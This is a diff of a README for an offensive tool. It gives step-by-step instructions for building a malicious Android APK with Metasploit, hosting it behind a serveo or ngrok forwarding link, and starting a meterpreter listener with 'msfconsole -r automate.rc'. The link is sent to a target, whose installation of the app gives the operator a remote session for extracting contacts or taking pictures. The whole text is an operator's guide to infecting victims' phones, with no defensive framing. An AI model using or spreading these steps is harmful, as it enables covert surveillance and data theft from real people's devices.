@@ -2,7 +2,10 @@
 
 1.Metasploit-Framework
 
-2.git
+2.PHP
+
+3.Openssh
+
 
 **Installation :-**
 
@@ -14,13 +17,13 @@
 
 **How to use :-**
 
-1.Run php by typing "sh php"
+1. Start the script by executing 'python attack.py'
 
-2.Run ssh by typing "sh ssh" and copy the link you get.   [NEW SESSION]
+2. Once the script completes, copy the link you got under "Forwarding HTTP port.." and your payload's name after it, for example : https://lente.serveo.net/lemon.apk, this link downloads the malicious apk when opened.
 
-3.Forward TCP connections by typing "sh payload", type a name for your payload followed by ".apk" at the end, then choose a port of your own and choose a forwarding service, specify if you already have Ngrok or not, serveo requires no installation. It will take a little time to create and upload the payload with the specified port and name.
+3.Open up a new session, and type "msfconsole -r automate.rc", this should start metasploit and provide it necessary options. Once it stops, type "run" and press enter, this will start the listener.
 
-4.Type "sh Handler" and read the info carefully. Now wait for the Handler to start, then type "set LHOST xxxx" and "set LPORT xxxx". Put the correct port and host according to the instructions, and finally type "run"   [NEW SESSION]
+4. When the target installs and open the apk using your link, you will get a meterpreter session in your listener.
 
-5.Now, put your payload's name after the link that you got after running "sh ssh" [For Example : lente.serveo.net/Name.apk] and send the link to the target Android, once the virus gets installed in the target device, you will see a meterpreter session opening, wait for a few seconds.
-  Type "?" and press enter. Now you can mess with the Android device using the commnands listed.
+5. Bow you can type 'help' for a list of options, example extract contacts, snap a picture etc.
+
